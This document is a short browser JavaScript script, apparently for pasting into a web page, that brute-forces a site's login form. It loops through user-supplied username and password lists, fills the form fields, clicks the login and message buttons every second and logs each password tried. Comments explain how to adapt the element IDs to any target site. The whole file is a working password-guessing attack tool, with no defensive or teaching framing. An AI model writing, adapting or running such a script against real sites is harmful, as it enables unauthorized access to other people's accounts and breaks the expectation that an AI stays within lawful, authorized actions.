var username = document.getElementById("login"); //change this with the element name in the website. 

var password = document.getElementById("password"); //change this with the element name in the website. 

var loginButton = document.getElementById("bLogin"); //change this with the element name in the website. 

var okBtn = document.getElementById("msgBtn1");

const passlist = [] //your password list here

const userlist = [] //your username list here

var i=0

function crack() {
    username.value = userlist[i]; //you could change this with a username if you know it eg. 'username'
    password.value = passlist[i];
    loginButton.click();
    okBtn.click();
    console.log(password.value);
    i+=1;

}

setInterval(crack, 1000);
